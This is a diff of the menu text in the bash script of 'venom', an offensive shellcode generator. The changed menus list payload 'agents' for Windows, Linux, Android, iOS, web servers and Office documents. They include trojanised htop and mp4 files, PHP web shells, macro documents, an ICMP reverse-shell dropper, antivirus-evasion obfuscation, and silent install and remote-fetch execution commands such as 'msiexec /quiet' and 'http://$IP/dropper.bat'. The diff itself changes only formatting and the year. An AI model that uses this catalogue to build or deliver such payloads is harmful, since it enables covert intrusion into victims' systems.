+    AGENT EXECUTION    : sudo dpkg -i agent.deb
+    DETECTION RATIO    : https://goo.gl/RVWKff
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux|Bsd|Solaris
-    | SHELLCODE FORMAT   : ELF
-    | AGENT EXTENSION    : ELF
-    | AGENT EXECUTION    : sudo ./agent.elf
-    | DETECTION RATIO    : https://goo.gl/YpyYwk
+    ──────────
+    TARGET SYSTEMS     : Linux|Bsd|Solaris
+    SHELLCODE FORMAT   : ELF
+    AGENT EXTENSION    : ELF
+    AGENT EXECUTION    : sudo ./agent.elf
+    DETECTION RATIO    : https://goo.gl/YpyYwk
 
     AGENT Nº4:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux (htop trojan)
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : DEB
-    | AGENT EXECUTION    : sudo ./agent.deb
-    | DETECTION RATIO    : https://goo.gl/naohaainda
+    ──────────
+    TARGET SYSTEMS     : Linux (htop trojan)
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : DEB
+    AGENT EXECUTION    : sudo ./agent.deb
+    DETECTION RATIO    : https://goo.gl/naohaainda
 
     AGENT Nº5:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux (mp4 trojan)
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : MP4
-    | AGENT EXECUTION    : sudo ./ricky-video.mp4
-    | DETECTION RATIO    : https://goo.gl/naohaainda
+    ──────────
+    TARGET SYSTEMS     : Linux (mp4 trojan)
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : MP4
+    AGENT EXECUTION    : sudo ./ricky-video.mp4
+    DETECTION RATIO    : https://goo.gl/naohaainda
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13198,179 +13332,179 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C (uuid obfuscation)
-    | AGENT EXTENSION    : DLL|CPL
-    | AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
-    | DETECTION RATIO    : http://goo.gl/NkVLzj
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C (uuid obfuscation)
+    AGENT EXTENSION    : DLL|CPL
+    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
+    DETECTION RATIO    : http://goo.gl/NkVLzj
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : DLL
-    | AGENT EXTENSION    : DLL|CPL
-    | AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
-    | DETECTION RATIO    : http://goo.gl/dBGd4x
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : DLL
+    AGENT EXTENSION    : DLL|CPL
+    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
+    DETECTION RATIO    : http://goo.gl/dBGd4x
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE
-    | AGENT EXECUTION    : python agent.py | press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/7rSEyA (.py)
-    | DETECTION RATIO    : https://goo.gl/WJ9HbD (.exe)
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE
+    AGENT EXECUTION    : python agent.py | press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/7rSEyA (.py)
+    DETECTION RATIO    : https://goo.gl/WJ9HbD (.exe)
 
     AGENT Nº4:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/WpgWCa
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/WpgWCa
 
     AGENT Nº5:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/MZnQKs
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/MZnQKs
 
     AGENT Nº6:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : RB
-    | AGENT EXECUTION    : ruby agent.rb
-    | DETECTION RATIO    : https://goo.gl/eZkoTP
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : RB
+    AGENT EXECUTION    : ruby agent.rb
+    DETECTION RATIO    : https://goo.gl/eZkoTP
 
     AGENT Nº7:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : MSI-NOUAC
-    | AGENT EXTENSION    : MSI
-    | AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi
-    | DETECTION RATIO    : https://goo.gl/zcA4xu
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : MSI-NOUAC
+    AGENT EXTENSION    : MSI
+    AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi
+    DETECTION RATIO    : https://goo.gl/zcA4xu
 
     AGENT Nº8:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : POWERSHELL
-    | AGENT EXTENSION    : BAT
-    | AGENT EXECUTION    : press to exec (bat)
-    | DETECTION RATIO    : https://goo.gl/BYCUhb
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : POWERSHELL
+    AGENT EXTENSION    : BAT
+    AGENT EXECUTION    : press to exec (bat)
+    DETECTION RATIO    : https://goo.gl/BYCUhb
 
     AGENT Nº9:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : HTA-PSH
-    | AGENT EXTENSION    : HTA
-    | AGENT EXECUTION    : http://$IP
-    | DETECTION RATIO    : https://goo.gl/mHC72C
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : HTA-PSH
+    AGENT EXTENSION    : HTA
+    AGENT EXECUTION    : http://$IP
+    DETECTION RATIO    : https://goo.gl/mHC72C
 
     AGENT Nº10:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD
-    | AGENT EXTENSION    : PS1 + BAT
-    | AGENT EXECUTION    : press to exec (bat)
-    | DETECTION RATIO    : https://goo.gl/GJHu7o
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD
+    AGENT EXTENSION    : PS1 + BAT
+    AGENT EXECUTION    : press to exec (bat)
+    DETECTION RATIO    : https://goo.gl/GJHu7o
 
     AGENT Nº11:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD
-    | AGENT EXTENSION    : BAT
-    | AGENT EXECUTION    : press to exec (bat)
-    | DETECTION RATIO    : https://goo.gl/nY2THB
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD
+    AGENT EXTENSION    : BAT
+    AGENT EXECUTION    : press to exec (bat)
+    DETECTION RATIO    : https://goo.gl/nY2THB
 
     AGENT Nº12:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : VBS
-    | AGENT EXTENSION    : VBS
-    | AGENT EXECUTION    : press to exec (vbs)
-    | DETECTION RATIO    : https://goo.gl/PDL4qF
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : VBS
+    AGENT EXTENSION    : VBS
+    AGENT EXECUTION    : press to exec (vbs)
+    DETECTION RATIO    : https://goo.gl/PDL4qF
 
     AGENT Nº13:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD
-    | AGENT EXTENSION    : VBS
-    | AGENT EXECUTION    : press to exec (vbs)
-    | DETECTION RATIO    : https://goo.gl/sd3867
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD
+    AGENT EXTENSION    : VBS
+    AGENT EXECUTION    : press to exec (vbs)
+    DETECTION RATIO    : https://goo.gl/sd3867
 
     AGENT Nº14:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD|C
-    | AGENT EXTENSION    : PDF
-    | AGENT EXECUTION    : press to exec (pdf)
-    | DETECTION RATIO    : https://goo.gl/N1VTPu
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD|C
+    AGENT EXTENSION    : PDF
+    AGENT EXECUTION    : press to exec (pdf)
+    DETECTION RATIO    : https://goo.gl/N1VTPu
 
     AGENT Nº15:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : EXE-SERVICE
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : sc start agent.exe
-    | DETECTION RATIO    : https://goo.gl/dCYdCo
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : EXE-SERVICE
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : sc start agent.exe
+    DETECTION RATIO    : https://goo.gl/dCYdCo
 
     AGENT Nº16:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/HgnSQW
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/HgnSQW
 
     AGENT Nº17:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C + AVET (obfuscation)
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/kKJuQ5
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C + AVET (obfuscation)
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/kKJuQ5
 
     AGENT Nº18:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : SHELLTER (trojan embedded)
-    | AGENT EXTENSION    : EXE
-    | AGENT EXECUTION    : press to exec (exe)
-    | DETECTION RATIO    : https://goo.gl/9MtQjM
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : SHELLTER (trojan embedded)
+    AGENT EXTENSION    : EXE
+    AGENT EXECUTION    : press to exec (exe)
+    DETECTION RATIO    : https://goo.gl/9MtQjM
 
     AGENT Nº19:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : CSHARP
-    | AGENT EXTENSION    : XML + BAT
-    | AGENT EXECUTION    : press to exec (bat)
-    | DETECTION RATIO    : https://goo.gl/coKiKx
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : CSHARP
+    AGENT EXTENSION    : XML + BAT
+    AGENT EXECUTION    : press to exec (bat)
+    DETECTION RATIO    : https://goo.gl/coKiKx
 
     AGENT Nº20:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PSH-CMD|EXE
-    | AGENT EXTENSION    : BAT|EXE
-    | AGENT EXECUTION    : http://$IP/EasyFileSharing.hta
-    | DETECTION RATIO    : https://goo.gl/R8UNW3
+    ───────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PSH-CMD|EXE
+    AGENT EXTENSION    : BAT|EXE
+    AGENT EXECUTION    : http://$IP/EasyFileSharing.hta
+    DETECTION RATIO    : https://goo.gl/R8UNW3
 
     AGENT Nº21:
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : ICMP (ping) Reverse Shell
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | AGENT EXTENSION    : EXE
-    | DROPPER EXTENSION  : BAT
-    | AGENT EXECUTION    : http://$IP/dropper.bat
-    | DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)
+    ───────────
+    DESCRIPTION        : ICMP (ping) Reverse Shell
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    AGENT EXTENSION    : EXE
+    DROPPER EXTENSION  : BAT
+    AGENT EXECUTION    : http://$IP/dropper.bat
+    DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13418,42 +13552,42 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
-    | SHELLCODE FORMAT   : PYTHON
-    | AGENT EXTENSION    : PY
-    | AGENT EXECUTION    : python agent.py
-    | DETECTION RATIO    : https://goo.gl/s5WqYS
+    ──────────
+    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
+    SHELLCODE FORMAT   : PYTHON
+    AGENT EXTENSION    : PY
+    AGENT EXECUTION    : python agent.py
+    DETECTION RATIO    : https://goo.gl/s5WqYS
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris
-    | SHELLCODE FORMAT   : JAVA|PSH
-    | AGENT EXTENSION    : JAR
-    | AGENT EXECUTION    : http://$IP
-    | DETECTION RATIO    : https://goo.gl/aEdLfD
+    ──────────
+    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris
+    SHELLCODE FORMAT   : JAVA|PSH
+    AGENT EXTENSION    : JAR
+    AGENT EXECUTION    : http://$IP
+    DETECTION RATIO    : https://goo.gl/aEdLfD
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
-    | SHELLCODE FORMAT   : PYTHON|PSH
-    | AGENT EXTENSION    : PY|BAT
-    | AGENT EXECUTION    : python agent.py | press to exec (bat)
-    | DETECTION RATIO    : https://goo.gl/vYLF8x
+    ──────────
+    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
+    SHELLCODE FORMAT   : PYTHON|PSH
+    AGENT EXTENSION    : PY|BAT
+    AGENT EXECUTION    : python agent.py | press to exec (bat)
+    DETECTION RATIO    : https://goo.gl/vYLF8x
 
     AGENT Nº4:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
-    | SHELLCODE FORMAT   : PYTHON (uuid obfuscation)
-    | AGENT EXTENSION    : PY
-    | AGENT EXECUTION    : python agent.py
-    | DETECTION RATIO    : https://goo.gl/nz8Hmr
+    ──────────
+    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
+    SHELLCODE FORMAT   : PYTHON (uuid obfuscation)
+    AGENT EXTENSION    : PY
+    AGENT EXECUTION    : python agent.py
+    DETECTION RATIO    : https://goo.gl/nz8Hmr
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13484,36 +13618,36 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Android
-    | SHELLCODE FORMAT   : DALVIK
-    | AGENT EXTENSION    : APK
-    | AGENT EXECUTION    : Android appl install
-    | DETECTION RATIO    : https://goo.gl/dy6bkF
+    ──────────
+    TARGET SYSTEMS     : Android
+    SHELLCODE FORMAT   : DALVIK
+    AGENT EXTENSION    : APK
+    AGENT EXECUTION    : Android appl install
+    DETECTION RATIO    : https://goo.gl/dy6bkF
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : IOS
-    | SHELLCODE FORMAT   : MACHO
-    | AGENT EXTENSION    : MACHO
-    | EXECUTE IN IOS     : chmod a+x agent.macho && ldid -S agent.macho
-    | AGENT EXECUTION    : sudo ./agent.macho
-    | DETECTION RATIO    : https://goo.gl/AhuyGs
+    ──────────
+    TARGET SYSTEMS     : IOS
+    SHELLCODE FORMAT   : MACHO
+    AGENT EXTENSION    : MACHO
+    EXECUTE IN IOS     : chmod a+x agent.macho && ldid -S agent.macho
+    AGENT EXECUTION    : sudo ./agent.macho
+    DETECTION RATIO    : https://goo.gl/AhuyGs
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Android
-    | SHELLCODE FORMAT   : Android ARM
-    | AGENT EXTENSION    : PDF
-    | AGENT EXECUTION    : agent.pdf (double clique)
-    | DETECTION RATIO    : https://goo.gl/Empty
-    | AFFECTED VERSIONS  : Adobe Reader versions less than 11.2.0
+    ──────────
+    TARGET SYSTEMS     : Android
+    SHELLCODE FORMAT   : Android ARM
+    AGENT EXTENSION    : PDF
+    AGENT EXECUTION    : agent.pdf (double clique)
+    DETECTION RATIO    : https://goo.gl/Empty
+    AFFECTED VERSIONS  : Adobe Reader versions less than 11.2.0
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13543,34 +13677,34 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Webservers|apache2
-    | SHELLCODE FORMAT   : PHP
-    | AGENT EXTENSION    : PHP
-    | AGENT EXECUTION    : http://$IP/agent.php
-    | DETECTION RATIO    : https://goo.gl/atfgWM
+    ──────────
+    TARGET SYSTEMS     : Webservers|apache2
+    SHELLCODE FORMAT   : PHP
+    AGENT EXTENSION    : PHP
+    AGENT EXECUTION    : http://$IP/agent.php
+    DETECTION RATIO    : https://goo.gl/atfgWM
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Webservers|apache2
-    | SHELLCODE FORMAT   : PHP (base64)
-    | AGENT EXTENSION    : PHP
-    | AGENT EXECUTION    : http://$IP/agent.php
-    | DETECTION RATIO    : https://goo.gl/mq5QD8
+    ──────────
+    TARGET SYSTEMS     : Webservers|apache2
+    SHELLCODE FORMAT   : PHP (base64)
+    AGENT EXTENSION    : PHP
+    AGENT EXECUTION    : http://$IP/agent.php
+    DETECTION RATIO    : https://goo.gl/mq5QD8
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : apache2 (Linux-Kali)
-    | SHELLCODE FORMAT   : PHP (base64)
-    | AGENT EXTENSION    : PHP + SH (unix_exploit)
-    | AGENT EXECUTION    : http://$IP/trigger.sh
-    | DETECTION RATIO    : https://goo.gl/wGgZtC
+    ──────────
+    TARGET SYSTEMS     : apache2 (Linux-Kali)
+    SHELLCODE FORMAT   : PHP (base64)
+    AGENT EXTENSION    : PHP + SH (unix_exploit)
+    AGENT EXECUTION    : http://$IP/trigger.sh
+    DETECTION RATIO    : https://goo.gl/wGgZtC
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13601,34 +13735,34 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows|OSx
-    | SHELLCODE FORMAT   : C|PYTHON
-    | AGENT EXTENSION    : DOCM
-    | AGENT EXECUTION    : press to exec (docm)
-    | DETECTION RATIO    : https://goo.gl/xcFKv8
+    ──────────
+    TARGET SYSTEMS     : Windows|OSx
+    SHELLCODE FORMAT   : C|PYTHON
+    AGENT EXTENSION    : DOCM
+    AGENT EXECUTION    : press to exec (docm)
+    DETECTION RATIO    : https://goo.gl/xcFKv8
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : PYTHON
-    | AGENT EXTENSION    : PPSX
-    | AGENT EXECUTION    : press to exec (ppsx)
-    | DETECTION RATIO    : https://goo.gl/r23dKW
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : PYTHON
+    AGENT EXTENSION    : PPSX
+    AGENT EXECUTION    : press to exec (ppsx)
+    DETECTION RATIO    : https://goo.gl/r23dKW
 
     AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Windows
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : RTF
-    | AGENT EXECUTION    : http://$IP:8080/doc | press to exec (rtf)
-    | DETECTION RATIO    : https://goo.gl/fUqWA4
+    ──────────
+    TARGET SYSTEMS     : Windows
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : RTF
+    AGENT EXECUTION    : http://$IP:8080/doc | press to exec (rtf)
+    DETECTION RATIO    : https://goo.gl/fUqWA4
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -13666,9 +13800,9 @@ cat << !
             \  \// |   ___||     \| ||     ||     \/   |
              \__/  |______||__/\____|\_____/|__/\__/|__|$ver
 !
-echo "     ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
+echo "       ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
 cat << !
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   1 - Unix based payloads                                   ║
     ║   2 - Windows-OS payloads                                   ║
     ║   3 - Multi-OS payloads                                     ║
@@ -13679,9 +13813,9 @@ cat << !
     ║   8 - Amsi Evasion Payloads                                 ║
     ║                                                             ║
     ║   E - Exit Shellcode Generator                              ║
-    ╚─────────────────────────────────────────────────────────────╣
+    ╚═════════════════════════════════════════════════════════════╣
 !
-echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2019${BlueF}_|"
+echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2020${BlueF}_|"
 
 echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
@@ -13700,5 +13834,3 @@ e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2 ;;
 esac
 done
-
-
